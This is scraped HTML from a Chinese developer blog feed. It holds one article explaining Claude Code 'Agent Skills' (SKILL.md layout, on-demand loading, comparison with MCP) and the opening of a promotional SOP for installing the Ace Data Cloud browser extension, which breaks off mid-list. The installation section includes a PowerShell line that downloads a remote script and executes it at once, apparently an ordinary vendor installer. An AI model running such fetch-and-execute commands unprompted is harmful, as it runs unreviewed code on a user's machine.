            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3650034333917031/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    KaneLogger
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T15:27:55.000Z" title="Tue Jan 20 2026 15:27:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/64133b5a33e94c4cbd00e99de984ec98~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgS2FuZUxvZ2dlcg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769527674&amp;x-signature=xS6hZWJ6Bvp8rMPyKLA4oQqWFYI%3D" alt="Agent_Skills_Progressive_Capability_Encapsulation-图片-0.jpg" loading="lazy"/></p>
<h2 data-id="heading-0">Agent Skills 是什么？</h2>
<p>Agent Skills 本质上是一种渐进式披露的提示词机制。
我理解 Skills 其实是一种上下文工程。Skills 只是把垂直领域的知识、脚本调用方法等挂载到 Agent 的上下文窗口。</p>
<p>Skills 将提示词拆解为三个层级，通过“按需加载”降低 Token 消耗与复杂度：</p>
<ul>
<li>元数据： 必须加载。类似书的“目录”。让 Agent 知道有哪些技能可用。</li>
<li>指令： 按需加载。类似书的“正文”。具体的执行步骤和 SOP。</li>
<li>资源： 按需加载。类似书的“附录”。模板、案例、规范文档。</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/49ad196cfc8a485b9f3f47bc5a87c0c8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgS2FuZUxvZ2dlcg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769527674&amp;x-signature=3HyvYtUCVm5ZcLCNj6AXUnRaLO0%3D" alt="image.png" loading="lazy"/>
Skill 文件结构：</p>
<pre><code class="hljs language-sh" lang="sh">/.claude/skills/skill-name
    ├── SKILL.md    <span class="hljs-comment"># 元数据+指令</span>
    ├── scripts/    <span class="hljs-comment"># 可执行脚本</span>
    │   └── main.py
    ├── references/ <span class="hljs-comment"># 补充文档（可选）</span>
    │   └── doc.md
    └── assets/     <span class="hljs-comment"># 素材资源</span>
        └── pic.jpg
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c0e569d5c6304cf196f1aae1187fcb85~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgS2FuZUxvZ2dlcg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769527674&amp;x-signature=GuCFl%2BQDQ5sc0WtxcI7KC4Yr2i0%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-1">SKILL.md 分析</h3>
<p>meta-data 元数据。最重要的部分。
描述部分这块最重要是写清楚 AI 应该在什么时机来调用这个 Skill。</p>
<pre><code class="hljs language-text" lang="text">---
name: { { 技能名称 } }
description: { { 描述部分 } }
---

{{ 指令部分 }}
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/71c918dcbb2a4348ad4bf490b00384fb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgS2FuZUxvZ2dlcg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769527674&amp;x-signature=CIgSiyWJ121usHPCVAKNOhibSMo%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-2">调用过程</h3>
<ol>
<li>用户 → Claude Code（agent）: {task}-结合材料写作、校对文章用词。</li>
<li>Claude Code（agent）→ 大模型：User{task};Available Skills: ....</li>
<li>大模型 → Claude Code（agent）: Choose Skill: 写作</li>
<li>【指令层 按需加载】Claude Code（agent）→ 大模型：SKILL.md</li>
<li>【资源层 按需加载】大模型 → Claude Code（agent）：Read references/*.md</li>
<li>Claude Code（agent）→ 大模型：提供references/*.md 中的内容</li>
<li>大模型 → 用户：最终回答</li>
</ol>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9314764b2dc2441c870c468c20ecfbd8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgS2FuZUxvZ2dlcg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769527674&amp;x-signature=gc%2BRGrfFyCw9HOaTZYWfZ5b4glg%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-3">Agent Skills vs MCP vs Prompt</h3>



































<table><thead><tr><th align="center"/><th align="center">Agent Skills</th><th align="center">MCP</th></tr></thead><tbody><tr><td align="center">侧重点</td><td align="center">提示词</td><td align="center">工具调用</td></tr><tr><td align="center">类比</td><td align="center">带目录的说明书</td><td align="center">标准化工具箱</td></tr><tr><td align="center">Token消耗</td><td align="center">低</td><td align="center">高</td></tr><tr><td align="center">核心主体</td><td align="center">SKILL.md</td><td align="center">软件包</td></tr><tr><td align="center">编写难度</td><td align="center">低</td><td align="center">高</td></tr></tbody></table>
<p>Skills 和 MCP 有什么区别？</p>
<ol>
<li>MCP 是一种开放标准的协议，关注的是 AI 如何以统一方式调用外部的工具、数据和服务，本身不定义任务逻辑或执行流程。</li>
<li>Skill 则教 Agent 如何完整处理特定工作，它将执行方法、工具调用方式以及相关知识材料，封装为一个完整的「能力扩展包」，使 Agent 具备稳定、可复用的做事方法。</li>
</ol>
<h3 data-id="heading-4">Agent Skills vs. Workflow 工作流</h3>
<p>两种不同的系统设计哲学：</p>
<ul>
<li>Workflow (刚性系统)： “预设路径”。在设计时枚举所有节点与连接。稳定性高，但脆弱，一旦遇到未知情况容易崩溃。类似于传统的工业流水线、财务审批流程。</li>
<li>Agent + Skills (柔性系统)： “涌现路径”。设计时只定义原子能力（Skills），运行时由 Agent 根据上下文动态决策执行路径。具有极强的适应性和进化能力，类似于生物生态系统。</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/021bca619e144483aa2d307734bffa3c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgS2FuZUxvZ2dlcg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769527674&amp;x-signature=VS3Cf5hYeM5T0rzZRM4Hk8KyKMY%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-5">技术实现</h2>
<p>标准目录结构：在 <code>/.claude/skills</code> 下创建项目：</p>
<pre><code class="hljs language-sh" lang="sh">/.claude/skills/skill-name
    ├── SKILL.md        <span class="hljs-comment"># 核心：元数据 + 指令</span>
    ├── scripts/        <span class="hljs-comment"># 可选：可执行脚本 (如 main.py)</span>
    ├── references/     <span class="hljs-comment"># 可选：补充文档 (如 规范.md)</span>
    └── assets/         <span class="hljs-comment"># 可选：素材资源 (如 模板.jpg)</span>
</code></pre>
<p>SKILL.md 编写规范</p>
<pre><code class="hljs language-text" lang="text">---
name: 文案大师 # 技能名称
description: 用于根据提供的材料撰写、校对和润色文章 # 描述（决定 AI 何时调用）
---

# 指令部分

这里写详细的 SOP、步骤要求、注意事项...
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3a165a4668394e1aa6f8476f0388d750~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgS2FuZUxvZ2dlcg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769527674&amp;x-signature=1D5yAcNOE0X4LqejRxWfe3isqbo%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-6">实战指南：从安装到构建</h2>
<h3 data-id="heading-7">1.环境准备</h3>
<ul>
<li>安装 Claude Code：
<ul>
<li>macOS: <code>brew install --cask claude-code</code></li>
<li>Windows (PowerShell): <code>irm https://claude.ai/install.ps1 | iex</code></li>
</ul>
</li>
</ul>
<h3 data-id="heading-8">2. 配置模型</h3>
<p>推荐使用 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ffarion1231%2Fcc-switch" target="_blank" title="https://github.com/farion1231/cc-switch" ref="nofollow noopener noreferrer">CC Switch</a> 管理模型版本。</p>
<h3 data-id="heading-9">3. 创建 Skill</h3>
<p>如何将一个任务转化为高质量的 Skill？
先判断是否是需要反复做的任务？如果只是一次就没必要做成Skill。因为 Skill 的核心价值在于复用。
再动手做几遍，沉淀最佳实践。思考记录哪些步骤是固定的？哪些地方容易出问题？什么样的输出质量最好？
具体操作：
让 Agent 帮你创建 Skill。新开一个会话，在支持 Skills 的 Agent 里把任务完整做一遍，做完后告诉它：把刚才的操作创建成一个 Skill，方便以后复用。
用 Skill 做任务，持续迭代优化。以后都用这个 Skill 来执行任务。每次完成后检查输出，哪里不满意就告诉 Agent，让它改进并更新 Skill。</p>
<p>简单来说就是：先人工跑通一遍任务，确认 SOP 无误后，告诉 Agent：“把刚才的操作创建成一个 Skill，方便以后复用。”</p>
<p><strong>快速创建技巧</strong></p>
<ul>
<li>交互式创建： 使用 <code>/skill-creator</code> 工具辅助创建。</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a30dc7c610da48faa46a3fc755bcf245~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgS2FuZUxvZ2dlcg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769527674&amp;x-signature=5tm7BbT0urarv5p7TozcoqKq7xk%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-10">深度思考：Skills 的长期价值</h2>
<p>其实在写这篇文章的时候我心里就在想：随着模型变强，Skills 会过时吗？
写完之后我得到了一个答案是：肯定会过时。Skills 只是短期红利，随着模型变强，好的Skills会内置进模型里面。
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/502239323741415fad63937c8b9fb8e3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgS2FuZUxvZ2dlcg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769527674&amp;x-signature=GEjGk0KL5MBPfVxdw89ZBKa6QbM%3D" alt="image.png" loading="lazy"/>
<strong>Skills 是短期的红利，但“能力”是长期的壁垒。</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a43faa1bbd774400a5d1e87dd1257755~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgS2FuZUxvZ2dlcg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769527674&amp;x-signature=p6weiV7eoCxHbJZNCpJ6BRRZUxM%3D" alt="image.png" loading="lazy"/></p>
<ul>
<li>当下红利（效率）： Skills 是当前技术阶段的“最优解”，它是封装特定工作流的产品，能直接带来生产力提升。</li>
<li>真正壁垒（认知）： Skills 的具体形式可能会变（未来模型可能不需要这么显式的 Skill），但你在这个过程中练就的问题拆解能力、流程设计能力、人机协同经验，是不会贬值的资产。</li>
</ul>
<p>所以我不应该只关注制作 Skill 这个动作，而要通过制作 Skill，<strong>沉淀自己解决复杂问题</strong>的思维模型，投资自己跨越周期的“问题解决能力”。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9a5fc99919b844f1ab08d200ff54fc63~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgS2FuZUxvZ2dlcg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769527674&amp;x-signature=aEZ0qrWwf%2FGB%2FOPOBFZszln8Wcc%3D" alt="image.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Ace Data Cloud 浏览器插件配置与内容发布 SOP（标准作业程序，参加活动送积分）]]></title>    <link>https://juejin.cn/post/7597266141912727598</link>    <guid>https://juejin.cn/post/7597266141912727598</guid>    <pubDate>2026-01-20T15:44:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597266141912727598" data-draft-id="7597258378590814218" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Ace Data Cloud 浏览器插件配置与内容发布 SOP（标准作业程序，参加活动送积分）"/> <meta itemprop="keywords" content="API"/> <meta itemprop="datePublished" content="2026-01-20T15:44:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="崔庆才丨静觅"/> <meta itemprop="url" content="https://juejin.cn/user/1521379821230269"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Ace Data Cloud 浏览器插件配置与内容发布 SOP（标准作业程序，参加活动送积分）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1521379821230269/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    崔庆才丨静觅
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T15:44:20.000Z" title="Tue Jan 20 2026 15:44:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>活动：2026.1.21~2026.1.27 期间开通自动发布并成功截图，可获得每日<strong>最高 50 积分≈￥48</strong>奖励（发布一个平台 10 积分），每日统计，可以叠加。</p>
</blockquote>
<p>本 SOP 用于指导团队完成两件事：<br/>
1）安装 Ace Data Cloud 浏览器插件并完成账号授权；<br/>
2）在 Ace Data Cloud 平台完成频道绑定、内容准备、发布与自动发布。</p>
<hr/>
<h2 data-id="heading-0">1. 目标与概述</h2>
<ul>
<li><strong>目标</strong>：通过 Ace Data Cloud 平台，将文章/视频等内容分发到多个自媒体平台（频道），提升分发效率，并通过自动发布实现“低人工投入”的持续推广。</li>
<li><strong>前置条件</strong>：
<ul>
<li>使用 Chrome 浏览器</li>
<li>可访问 Ace Data Cloud 平台</li>
<li>已下载浏览器插件压缩包并解压</li>
<li><strong>浏览器插件配置文档（平台内）</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fplatform.acedata.cloud%2Fdocuments%2F6becb82d-5981-4c21-a596-39e751647fb1" target="_blank" title="https://platform.acedata.cloud/documents/6becb82d-5981-4c21-a596-39e751647fb1" ref="nofollow noopener noreferrer">链接</a></li>
</ul>
</li>
</ul>
<hr/>
<h2 data-id="heading-1">2. 核心概念说明</h2>
<ul>
<li><strong>浏览器插件</strong>：用于在第三方平台（如知乎、CSDN 等）完成账号授权，使 Ace Data Cloud 能代表你执行发布。</li>
<li><strong>频道（Channels）</strong>：目标发布平台的账号授权通道（如知乎、CSDN、掘金等）。</li>
<li><strong>材料（Materials）</strong>：平台提供的可直接使用/参考的预制内容库。</li>
<li><strong>文档（Docs）</strong>：你准备发布的内容草稿（可由材料生成，也可自己创建）。</li>
<li><strong>发布任务（Tasks）</strong>：每一次发布操作生成的记录，用于追踪状态、链接与结果。</li>
</ul>
<hr/>
<h2 data-id="heading-2">3. 插件安装 SOP</h2>
<h3 data-id="heading-3">3.1 下载插件</h3>
<ol>
<li>访问下载链接并下载压缩包：
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcdn.acedata.cloud%2Fi9h4af.zip" target="_blank" title="https://cdn.acedata.cloud/i9h4af.zip" ref="nofollow noopener noreferrer">cdn.acedata.cloud/i9h4af.zip</a></li>
</ul>
</li>
<li>解压后得到一个插件文件夹（保持文件夹结构不变）。</li>
</ol>
<h3 data-id="heading-4">3.2 安装插件（Chrome）</h3>
<ol>
<li>在 Chrome 地址栏输入：<code>chrome://extensions</code></li>
<li>打开右上角 <strong>开发者模式（Developer mode）</strong></li>
<li>点击 <strong>Load unpacked（加载已解压的扩展程序）</strong></li>
<li>选择你刚刚解压出来的插件文件夹并确认</li>
</ol>
<h3 data-id="heading-5">3.3 安装成功验证</h3>
<ol>
<li>打开 Ace Data Cloud 分发中心页面并刷新：
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fplatform.acedata.cloud%2Fconsole%2Fpublish" target="_blank" title="https://platform.acedata.cloud/console/publish" ref="nofollow noopener noreferrer">platform.acedata.cloud/console/pub…</a></li>
</ul>
</li>
<li>如果页面不再出现“未安装浏览器插件”的提示，则安装成功。</li>
</ol>
<hr/>
<h2 data-id="heading-6">4. 内容发布平台 SOP（含截图）</h2>
<blockquote>
<p>以下 SOP 以平台页面为主线：<strong>分发中心 → 频道 → 文档/材料 → 发布任务 → 自动发布</strong><br/>
截图说明：</p>
<ul>
<li>截图1：发布中心</li>
<li>截图2：频道管理</li>
<li>截图3：发布任务</li>
<li>截图4：发布概览/摘要</li>
</ul>
</blockquote>
<hr/>
<h3 data-id="heading-7">4.1 步骤一：进入发布中心（总览与自动发布开关）</h3>
<ul>
<li><strong>目标</strong>：确认插件状态正常，并了解“自动发布”入口与整体状态。</li>
</ul>
<p><strong>操作：</strong></p>
<ol>
<li>进入分发中心： <a href="https://link.juejin.cn?target=https%3A%2F%2Fplatform.acedata.cloud%2Fconsole%2Fpublish" target="_blank" title="https://platform.acedata.cloud/console/publish" ref="nofollow noopener noreferrer">platform.acedata.cloud/console/pub…</a></li>
<li>检查是否存在“未安装插件”等异常提示</li>
<li>熟悉页面内的自动发布模块、整体概览信息</li>
</ol>
<p><strong>检查点：</strong></p>
<ul>
<li>页面正常显示，无插件缺失提示</li>
<li>能看到自动发布模块（开关/说明）</li>
</ul>
<p><strong>截图1（发布中心）</strong><br/>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/21c5c59e8ef74af8bc3af00d8b043f10~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bSU5bqG5omN5Lio6Z2Z6KeF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769528661&amp;x-signature=MUBCwtg7TjQsYEpjQalh%2Bh%2BcwyI%3D" alt="截图1-发布中心" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-8">4.2 步骤二：绑定发布频道（授权第三方账号）</h3>
<ul>
<li><strong>目标</strong>：将第三方平台账号授权给 Ace Data Cloud，建立发布通道。</li>
</ul>
<p><strong>操作：</strong></p>
<ol>
